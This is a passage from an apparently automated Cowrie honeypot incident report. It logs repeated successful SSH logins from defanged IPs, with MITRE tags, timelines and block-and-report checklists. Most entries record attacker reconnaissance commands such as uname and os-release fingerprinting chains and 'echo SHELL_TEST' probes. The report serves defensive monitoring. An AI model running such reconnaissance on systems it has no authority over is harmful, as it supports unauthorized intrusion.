| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:17:14` | `cowrie.session.connect` |
| `2026-07-06 12:17:17` | `cowrie.client.version` |
| `2026-07-06 12:17:17` | `cowrie.client.kex` |
| `2026-07-06 12:17:28` | `cowrie.login.success` |
| `2026-07-06 12:17:34` | `cowrie.session.params` |
| `2026-07-06 12:17:34` | `cowrie.command.input` |
| `2026-07-06 12:17:34` | `cowrie.command.input` |
| `2026-07-06 12:17:34` | `cowrie.command.input` |
| `2026-07-06 12:17:34` | `cowrie.command.input` |
| `2026-07-06 12:17:34` | `cowrie.command.input` |
| `2026-07-06 12:17:34` | `cowrie.command.success` |
| `2026-07-06 12:17:34` | `cowrie.command.input` |
| `2026-07-06 12:17:34` | `cowrie.command.input` |
| `2026-07-06 12:17:34` | `cowrie.command.input` |
| `2026-07-06 12:17:34` | `cowrie.command.input` |
| `2026-07-06 12:17:37` | `cowrie.log.closed` |
| `2026-07-06 12:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d00f26b2110d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:17 |
| **Last Seen** | 2026-07-06 12:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:17:52` | `cowrie.session.connect` |
| `2026-07-06 12:17:52` | `cowrie.client.version` |
| `2026-07-06 12:17:52` | `cowrie.client.kex` |
| `2026-07-06 12:17:54` | `cowrie.login.success` |
| `2026-07-06 12:17:55` | `cowrie.session.params` |
| `2026-07-06 12:17:55` | `cowrie.command.input` |
| `2026-07-06 12:17:55` | `cowrie.command.input` |
| `2026-07-06 12:17:55` | `cowrie.command.input` |
| `2026-07-06 12:17:55` | `cowrie.command.input` |
| `2026-07-06 12:17:55` | `cowrie.command.input` |
| `2026-07-06 12:17:55` | `cowrie.command.success` |
| `2026-07-06 12:17:55` | `cowrie.command.input` |
| `2026-07-06 12:17:55` | `cowrie.command.input` |
| `2026-07-06 12:17:55` | `cowrie.command.input` |
| `2026-07-06 12:17:55` | `cowrie.command.input` |
| `2026-07-06 12:17:56` | `cowrie.log.closed` |
| `2026-07-06 12:17:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb69c5738849

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:19 |
| **Last Seen** | 2026-07-06 12:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:19:23` | `cowrie.session.connect` |
| `2026-07-06 12:19:23` | `cowrie.client.version` |
| `2026-07-06 12:19:23` | `cowrie.client.kex` |
| `2026-07-06 12:19:25` | `cowrie.login.success` |
| `2026-07-06 12:19:26` | `cowrie.session.params` |
| `2026-07-06 12:19:26` | `cowrie.command.input` |
| `2026-07-06 12:19:26` | `cowrie.command.input` |
| `2026-07-06 12:19:26` | `cowrie.command.input` |
| `2026-07-06 12:19:26` | `cowrie.command.input` |
| `2026-07-06 12:19:26` | `cowrie.command.input` |
| `2026-07-06 12:19:26` | `cowrie.command.success` |
| `2026-07-06 12:19:26` | `cowrie.command.input` |
| `2026-07-06 12:19:26` | `cowrie.command.input` |
| `2026-07-06 12:19:26` | `cowrie.command.input` |
| `2026-07-06 12:19:26` | `cowrie.command.input` |
| `2026-07-06 12:19:26` | `cowrie.log.closed` |
| `2026-07-06 12:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d524c4d47b67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:19 |
| **Last Seen** | 2026-07-06 12:20 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:19:30` | `cowrie.session.connect` |
| `2026-07-06 12:19:33` | `cowrie.client.version` |
| `2026-07-06 12:19:33` | `cowrie.client.kex` |
| `2026-07-06 12:19:47` | `cowrie.login.success` |
| `2026-07-06 12:19:54` | `cowrie.session.params` |
| `2026-07-06 12:19:54` | `cowrie.command.input` |
| `2026-07-06 12:19:54` | `cowrie.command.input` |
| `2026-07-06 12:19:54` | `cowrie.command.input` |
| `2026-07-06 12:19:54` | `cowrie.command.input` |
| `2026-07-06 12:19:54` | `cowrie.command.input` |
| `2026-07-06 12:19:54` | `cowrie.command.success` |
| `2026-07-06 12:19:54` | `cowrie.command.input` |
| `2026-07-06 12:19:54` | `cowrie.command.input` |
| `2026-07-06 12:19:54` | `cowrie.command.input` |
| `2026-07-06 12:19:54` | `cowrie.command.input` |
| `2026-07-06 12:19:57` | `cowrie.log.closed` |
| `2026-07-06 12:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7222c2a0dc2c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 12:20 |
| **Last Seen** | 2026-07-06 12:20 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:20:31` | `cowrie.session.connect` |
| `2026-07-06 12:20:32` | `cowrie.client.version` |
| `2026-07-06 12:20:32` | `cowrie.client.kex` |
| `2026-07-06 12:20:39` | `cowrie.login.success` |
| `2026-07-06 12:20:42` | `cowrie.session.params` |
| `2026-07-06 12:20:42` | `cowrie.command.input` |
| `2026-07-06 12:20:44` | `cowrie.log.closed` |
| `2026-07-06 12:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1a211a83f5f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:20 |
| **Last Seen** | 2026-07-06 12:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:20:54` | `cowrie.session.connect` |
| `2026-07-06 12:20:54` | `cowrie.client.version` |
| `2026-07-06 12:20:54` | `cowrie.client.kex` |
| `2026-07-06 12:20:56` | `cowrie.login.success` |
| `2026-07-06 12:20:57` | `cowrie.session.params` |
| `2026-07-06 12:20:57` | `cowrie.command.input` |
| `2026-07-06 12:20:57` | `cowrie.command.input` |
| `2026-07-06 12:20:57` | `cowrie.command.input` |
| `2026-07-06 12:20:57` | `cowrie.command.input` |
| `2026-07-06 12:20:57` | `cowrie.command.input` |
| `2026-07-06 12:20:57` | `cowrie.command.success` |
| `2026-07-06 12:20:57` | `cowrie.command.input` |
| `2026-07-06 12:20:57` | `cowrie.command.input` |
| `2026-07-06 12:20:57` | `cowrie.command.input` |
| `2026-07-06 12:20:57` | `cowrie.command.input` |
| `2026-07-06 12:20:58` | `cowrie.log.closed` |
| `2026-07-06 12:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-524bc9763ea2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:21 |
| **Last Seen** | 2026-07-06 12:22 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:21:47` | `cowrie.session.connect` |
| `2026-07-06 12:21:50` | `cowrie.client.version` |
| `2026-07-06 12:21:50` | `cowrie.client.kex` |
| `2026-07-06 12:22:04` | `cowrie.login.success` |
| `2026-07-06 12:22:11` | `cowrie.session.params` |
| `2026-07-06 12:22:11` | `cowrie.command.input` |
| `2026-07-06 12:22:11` | `cowrie.command.input` |
| `2026-07-06 12:22:11` | `cowrie.command.input` |
| `2026-07-06 12:22:11` | `cowrie.command.input` |
| `2026-07-06 12:22:11` | `cowrie.command.input` |
| `2026-07-06 12:22:11` | `cowrie.command.success` |
| `2026-07-06 12:22:11` | `cowrie.command.input` |
| `2026-07-06 12:22:11` | `cowrie.command.input` |
| `2026-07-06 12:22:11` | `cowrie.command.input` |
| `2026-07-06 12:22:11` | `cowrie.command.input` |
| `2026-07-06 12:22:14` | `cowrie.log.closed` |
| `2026-07-06 12:22:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4f40e6ed903

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:22 |
| **Last Seen** | 2026-07-06 12:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:22:23` | `cowrie.session.connect` |
| `2026-07-06 12:22:23` | `cowrie.client.version` |
| `2026-07-06 12:22:23` | `cowrie.client.kex` |
| `2026-07-06 12:22:25` | `cowrie.login.success` |
| `2026-07-06 12:22:26` | `cowrie.session.params` |
| `2026-07-06 12:22:26` | `cowrie.command.input` |
| `2026-07-06 12:22:26` | `cowrie.command.input` |
| `2026-07-06 12:22:26` | `cowrie.command.input` |
| `2026-07-06 12:22:26` | `cowrie.command.input` |
| `2026-07-06 12:22:26` | `cowrie.command.input` |
| `2026-07-06 12:22:26` | `cowrie.command.success` |
| `2026-07-06 12:22:26` | `cowrie.command.input` |
| `2026-07-06 12:22:26` | `cowrie.command.input` |
| `2026-07-06 12:22:26` | `cowrie.command.input` |
| `2026-07-06 12:22:26` | `cowrie.command.input` |
| `2026-07-06 12:22:26` | `cowrie.log.closed` |
| `2026-07-06 12:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0937999def8a

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:22 |
| **Last Seen** | 2026-07-06 12:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:22:26` | `cowrie.session.connect` |
| `2026-07-06 12:22:26` | `cowrie.client.version` |
| `2026-07-06 12:22:27` | `cowrie.client.kex` |
| `2026-07-06 12:22:28` | `cowrie.login.success` |
| `2026-07-06 12:22:29` | `cowrie.session.params` |
| `2026-07-06 12:22:29` | `cowrie.command.input` |
| `2026-07-06 12:22:29` | `cowrie.log.closed` |
| `2026-07-06 12:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90366e1d68ea

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:22 |
| **Last Seen** | 2026-07-06 12:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:22:29` | `cowrie.session.connect` |
| `2026-07-06 12:22:29` | `cowrie.client.version` |
| `2026-07-06 12:22:30` | `cowrie.client.kex` |
| `2026-07-06 12:22:31` | `cowrie.login.success` |
| `2026-07-06 12:22:32` | `cowrie.session.params` |
| `2026-07-06 12:22:32` | `cowrie.command.input` |
| `2026-07-06 12:22:32` | `cowrie.log.closed` |
| `2026-07-06 12:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23cbe928b832

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:22 |
| **Last Seen** | 2026-07-06 12:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:22:33` | `cowrie.session.connect` |
| `2026-07-06 12:22:33` | `cowrie.client.version` |
| `2026-07-06 12:22:33` | `cowrie.client.kex` |
| `2026-07-06 12:22:34` | `cowrie.login.success` |
| `2026-07-06 12:22:35` | `cowrie.session.params` |
| `2026-07-06 12:22:35` | `cowrie.command.input` |
| `2026-07-06 12:22:35` | `cowrie.log.closed` |
| `2026-07-06 12:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03dec326dc9f

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:22 |
| **Last Seen** | 2026-07-06 12:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:22:36` | `cowrie.session.connect` |
| `2026-07-06 12:22:36` | `cowrie.client.version` |
| `2026-07-06 12:22:36` | `cowrie.client.kex` |
| `2026-07-06 12:22:37` | `cowrie.login.success` |
| `2026-07-06 12:22:38` | `cowrie.session.params` |
| `2026-07-06 12:22:38` | `cowrie.command.input` |
| `2026-07-06 12:22:38` | `cowrie.log.closed` |
| `2026-07-06 12:22:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6588618045b

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:22 |
| **Last Seen** | 2026-07-06 12:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:22:39` | `cowrie.session.connect` |
| `2026-07-06 12:22:39` | `cowrie.client.version` |
| `2026-07-06 12:22:39` | `cowrie.client.kex` |
| `2026-07-06 12:22:40` | `cowrie.login.success` |
| `2026-07-06 12:22:41` | `cowrie.session.params` |
| `2026-07-06 12:22:41` | `cowrie.command.input` |
| `2026-07-06 12:22:41` | `cowrie.log.closed` |
| `2026-07-06 12:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e24214cd683

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:22 |
| **Last Seen** | 2026-07-06 12:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:22:42` | `cowrie.session.connect` |
| `2026-07-06 12:22:42` | `cowrie.client.version` |
| `2026-07-06 12:22:42` | `cowrie.client.kex` |
| `2026-07-06 12:22:43` | `cowrie.login.success` |
| `2026-07-06 12:22:44` | `cowrie.session.params` |
| `2026-07-06 12:22:44` | `cowrie.command.input` |
| `2026-07-06 12:22:45` | `cowrie.log.closed` |
| `2026-07-06 12:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12d9e7dcd895

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:22 |
| **Last Seen** | 2026-07-06 12:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:22:45` | `cowrie.session.connect` |
| `2026-07-06 12:22:45` | `cowrie.client.version` |
| `2026-07-06 12:22:45` | `cowrie.client.kex` |
| `2026-07-06 12:22:46` | `cowrie.login.success` |
| `2026-07-06 12:22:47` | `cowrie.session.params` |
| `2026-07-06 12:22:47` | `cowrie.command.input` |
| `2026-07-06 12:22:47` | `cowrie.log.closed` |
| `2026-07-06 12:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1123236aa764

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:22 |
| **Last Seen** | 2026-07-06 12:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:22:48` | `cowrie.session.connect` |
| `2026-07-06 12:22:48` | `cowrie.client.version` |
| `2026-07-06 12:22:48` | `cowrie.client.kex` |
| `2026-07-06 12:22:49` | `cowrie.login.success` |
| `2026-07-06 12:22:50` | `cowrie.session.params` |
| `2026-07-06 12:22:50` | `cowrie.command.input` |
| `2026-07-06 12:22:51` | `cowrie.log.closed` |
| `2026-07-06 12:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45cd0baee8e2

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:22 |
| **Last Seen** | 2026-07-06 12:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:22:51` | `cowrie.session.connect` |
| `2026-07-06 12:22:51` | `cowrie.client.version` |
| `2026-07-06 12:22:51` | `cowrie.client.kex` |
| `2026-07-06 12:22:52` | `cowrie.login.success` |
| `2026-07-06 12:22:53` | `cowrie.session.params` |
| `2026-07-06 12:22:53` | `cowrie.command.input` |
| `2026-07-06 12:22:54` | `cowrie.log.closed` |
| `2026-07-06 12:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b0ddd1a0b15

| Field | Detail |
|---|---|
| **Source IP** | `163.61.39[.]40` |
| **First Seen** | 2026-07-06 12:22 |
| **Last Seen** | 2026-07-06 12:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:22:54` | `cowrie.session.connect` |
| `2026-07-06 12:22:54` | `cowrie.client.version` |
| `2026-07-06 12:22:54` | `cowrie.client.kex` |
| `2026-07-06 12:22:55` | `cowrie.login.success` |
| `2026-07-06 12:22:57` | `cowrie.session.params` |
| `2026-07-06 12:22:57` | `cowrie.command.input` |
| `2026-07-06 12:22:57` | `cowrie.log.closed` |
| `2026-07-06 12:22:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.61.39[.]40` to AbuseIPDB if not already reported
- [ ] Block `163.61.39[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8b991067659

| Field | Detail |
|---|---|
